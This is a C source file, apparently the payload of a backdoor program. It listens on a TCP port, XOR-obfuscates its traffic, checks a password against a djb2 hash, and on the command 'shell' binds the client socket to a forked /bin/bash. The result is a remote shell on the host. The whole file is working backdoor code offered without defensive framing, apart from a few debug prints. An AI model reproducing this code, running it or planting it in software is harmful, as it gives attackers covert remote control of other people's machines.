#include "payload.h"

#include <sys/select.h>
#include <sys/socket.h>

#include <arpa/inet.h>

#include <stdio.h>

#define SOCKET_ERROR -1

static unsigned long	hash_djb2(unsigned char *str)
{
	unsigned long	hash = 5381;
	int		c;

	while ((c = *str++))
		hash = ((hash << 5) + hash) + c; /* hash * 33 + c */
	return (hash);
}

static void		decrypt_msg(char *str, const int len)
{
	int i = 0;

	while (i < len - 1)
	{
		str[i] ^= KEY;
		i++;
	}
}

static void		encrypt_msg(char *str, const int len)
{
	int i = 0;

	while (i < len - 1)
	{
		str[i] ^= KEY;
		i++;
	}
}

static int		write_client(const SOCKET sock, char *buffer, const int len)
{
	encrypt_msg(buffer, len);
	if (send(sock, buffer, len, 0) < 0)
		return (-1);
	return (0);
}

static int		write_client_inshell(const SOCKET sock, char *buffer, const int len)
{
	if (send(sock, buffer, len, 0) < 0)
		return (-1);
	return (0);
}

static void		ask_passwd(const SOCKET sock)
{
	char	str[] = "passwd:\n\0";

	write_client(sock, str, 9);
}

static void		send_shutdown(const SOCKET sock, uint8_t in_shell)
{
	char	str[] = "shutdown\0";
	
	if (in_shell)
		write_client_inshell(sock, str, 9);
	else
		write_client(sock, str, 9);
}

static void		send_in_shell(const SOCKET sock)
{
	char	str[] = "in_shell\0";

	write_client(sock, str, 9);
}

static void		send_out_shell(const SOCKET sock)
{
	char	str[] = "out_shell\0";

	write_client(sock, str, 9);
}

static void		all_shutdown(t_client *client, const int len)
{
	for (int i = 0; i < len; i++)
	{
		if (client[i].sock != 0)
		{
			send_shutdown(client[i].sock, client[i].shell);
		}
	}
}

static int		all_close(t_client *client, const int len)
{
	for (int i = 0; i < len; i++)
	{
		if (client[i].sock != 0)
			return (0);
	}
	return (1);
}

static int		read_client(const SOCKET sock, uint8_t *auth)
{
	char			buffer[MAXMSG];
	int			n;

	memset(buffer, '\0', MAXMSG);
	n = recv(sock, buffer, MAXMSG - 1, 0);
	decrypt_msg(buffer, n);
	if (buffer[n - 1] == '\n')
		buffer[n - 1] = '\0';
	if (n < 0)
		return (1);
	else if (n == 0)
		return (-1);
	else
	{
		if (*auth == 0)
		{
			if (PASSWD_HASH == hash_djb2((unsigned char*)buffer))
			{
				*auth = 1;
				return (0);
			}
			ask_passwd(sock);
			return (0);
		}
		if ((strcmp(buffer, "quit")) == 0)
			return (1);
		else if ((strcmp(buffer, "shell") == 0))
			return(2);
		return (0);
	}
	return (0);
}

static void		clear_client(t_client *client, const int i)
{
	if (client[i].sock > 0)
		close(client[i].sock);
	client[i].auth = 0;
	client[i].sock = 0;
	client[i].shell = 0;
	client[i].thread = 0;
	client[i].pid = 0;
}

static void		clear_clients(t_client *client, const int len)
{
	for (int i = 0; i < len; i++)
		clear_client(client, i);
}

static int		get_max(t_client *client, const int len, const SOCKET srv)
{
	int max = srv;

	for (int i = 0; i < len; i++)
	{
		if (client[i].sock > max && client[i].shell == 0)
			max = client[i].sock;
	}
	return (max);
}

static void		add_sock_client(t_client *client, const int len, const SOCKET sock)
{
	for (int i = 0; i < len; i++)
	{
		if (client[i].sock == 0)
		{
			client[i].sock = sock;
			return;
		}
	}
}

static int		get_client_by_sock(t_client *client, const int len, const SOCKET sock)
{
	for (int i = 0; i < len; i++)
	{
		if (client[i].sock == sock)
			return (i);
	}
	dprintf(1, "ICI PAS BON\n");
	return (0);
}

static void		set_sock_monitoring(t_client_connect *client_connect, const SOCKET sock)
{
	dprintf(1, "set_sock_monitoring: %d\n", sock);
	pthread_mutex_lock(&(client_connect->mut_sock_monitoring));
	client_connect->sock_monitoring = sock;
	dprintf(1, "set_sock_monitoring end: %d\n", sock);
}

static void		unset_sock_monitoring(t_client_connect *client_connect)
{
	dprintf(1, "unset_sock_monitoring:\n");
	pthread_mutex_unlock(&(client_connect->mut_sock_monitoring));
	dprintf(1, "unset_sock_monitoring end\n");
}

static void		set_nb_client(t_client_connect *client_connect, const int nb)
{
	pthread_mutex_lock(&(client_connect->mut_nb_client));
	client_connect->nb_client += nb;
	pthread_mutex_unlock(&(client_connect->mut_nb_client));
}

static void		end_shell(t_client_connect *client_connect, const SOCKET sock)
{
	int index = get_client_by_sock(client_connect->client, MAXCLIENT, sock);

	clear_client(client_connect->client, index);
	send_out_shell(sock);
	send_shutdown(sock, 0);
	set_nb_client(client_connect, -1);
}

static void		init_client(t_client *client, int len)
{
	for (int i = 0; i < len; i++)
	{
		client[i].auth = 0;
		client[i].sock = 0;
		client[i].shell = 0;
		client[i].thread = 0;
		client[i].pid = 0;
	}
}

static void		init_struct(t_client_connect *client_connect)
{
	pthread_mutex_init(&(client_connect->mut_sock_monitoring), NULL);
	pthread_mutex_init(&(client_connect->mut_nb_client), NULL);
	client_connect->nb_client = 0;
	FD_ZERO(&(client_connect->active_fd));
	init_client(client_connect->client, MAXCLIENT);
	set_sock_monitoring(client_connect, 0);
	unset_sock_monitoring(client_connect);
}

void			*monitor_shell(void *p_data)
{
	t_client_connect	*client_connect;
	SOCKET			sock;
	pid_t			pid;

	client_connect = (t_client_connect*)p_data;
	sock = client_connect->sock_monitoring;
	unset_sock_monitoring(client_connect);
	pid = client_connect->client[get_client_by_sock(client_connect->client, MAXCLIENT, sock)].pid;
	dprintf(1, "pid: %d\n avant wait", pid);
	waitpid(pid, NULL, 0);
	dprintf(1, "pid: %d apres wait\n", pid);
	end_shell(client_connect, sock);
	dprintf(1, "pid: %d apres wait\n", pid);
	return (0);
}

static int		start_shell(t_client_connect *client_connect, const SOCKET sock)
{
	pid_t		pid;
	int		ret;
	int		index;

	index = get_client_by_sock(client_connect->client, MAXCLIENT, sock);
	client_connect->client[index].shell = 1;
	send_in_shell(sock);
	set_sock_monitoring(client_connect, sock);
	pid = fork();
	if (pid < 0)
		return (1);
	if (pid == 0)
	{
		if ((dup2(sock, STDIN_FILENO)) < 0)
			exit (EXIT_FAILURE);
		if ((dup2(sock, STDOUT_FILENO)) < 0)
			exit (EXIT_FAILURE);
		if ((dup2(sock, STDERR_FILENO)) < 0)
			exit (EXIT_FAILURE);
		if ((execl("/bin/bash", "", NULL)) < 0)
			exit (EXIT_FAILURE);
	}
	else
	{
		client_connect->client[index].pid = pid;
		if ((ret = pthread_create(&(client_connect->client[index].thread), NULL, monitor_shell, client_connect)))
			return (1);
	}
	return (0);
}

int			run_server(const SOCKET *sock)
{
	struct sockaddr_in	info_client;
	fd_set			readfds;
	socklen_t		size;
	int			new_client;
	int			index_client;
	int			in_close;
	int			ret;
	int			max;
	t_client_connect	client_connect;

	in_close = 0;
	size = sizeof(info_client);
	init_struct(&client_connect);
	FD_SET(*sock, &(client_connect.active_fd));
	while (1)
	{
		max = get_max(client_connect.client, MAXCLIENT, *sock);
		readfds = client_connect.active_fd;
		if (select(max + 1, &readfds, NULL, NULL, NULL) < 0)
			goto err;
		for (int i = 0; i < max + 1; i++)
		{
			if (FD_ISSET(i, &readfds))
			{
				dprintf(1, "ici %d\n", i);
				if (i == *sock)
				{
					if ((new_client = accept(*sock, (struct sockaddr*)&info_client, &size)) < 0)
						goto err;
					if (client_connect.nb_client < MAXCLIENT && in_close == 0)
					{
						FD_SET(new_client, &(client_connect.active_fd));
						set_nb_client(&client_connect, 1);
						add_sock_client(client_connect.client, MAXCLIENT, new_client);
						ask_passwd(new_client);
					}
					else
						close(new_client);
				}
				else
				{
					index_client = get_client_by_sock(client_connect.client, MAXCLIENT, i);
					ret = read_client(i, &(client_connect.client[index_client]).auth);
					if (ret < 0)
					{
						FD_CLR(i, &client_connect.active_fd);
						set_nb_client(&client_connect, -1);
						clear_client(client_connect.client, index_client);
						dprintf(1, "clear client ret < 0: %d\n", client_connect.client[i].sock);
					}
					else if (ret == 1)
					{
						in_close = 1;
						all_shutdown(client_connect.client, MAXCLIENT);
					}
					else if (ret == 2)
					{
						FD_CLR(i, &(client_connect.active_fd));
						start_shell(&client_connect, i);
					}
				}
			}
		}
		if (in_close == 1 && (all_close(client_connect.client, MAXCLIENT)) == 1)
		{
			clear_clients(client_connect.client, MAXCLIENT);
			close(*sock);
			return (0);
		}
	}
	return (0);
err:
	clear_clients(client_connect.client, MAXCLIENT);
	close(*sock);
	return (-1);
}

int			create_server()
{
	SOCKET			sock;
	struct sockaddr_in	sin;

	sock = 0;
	memset(&sin, 0, sizeof(sin));
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
		return (-1);
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(SRV_PORT);
	if ((bind(sock, (struct sockaddr*)&sin, sizeof(sin))) != SOCKET_ERROR)
		if ((listen(sock, 5)) != SOCKET_ERROR)
			return sock;
	close(sock);
	return (-1);
}
